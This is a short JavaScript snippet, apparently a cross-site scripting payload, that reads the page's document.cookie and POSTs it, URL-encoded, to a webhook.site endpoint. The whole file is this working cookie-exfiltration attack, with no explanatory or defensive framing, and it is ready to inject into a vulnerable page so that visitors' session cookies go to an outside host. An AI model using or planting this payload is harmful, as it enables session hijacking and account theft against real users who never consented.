var xhr = new XMLHttpRequest();
xhr.open("POST", "https://webhook.site/3cabb68d-cf97-44ee-85ea-1aed903c1e57", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("cookies=" + encodeURIComponent(document.cookie));
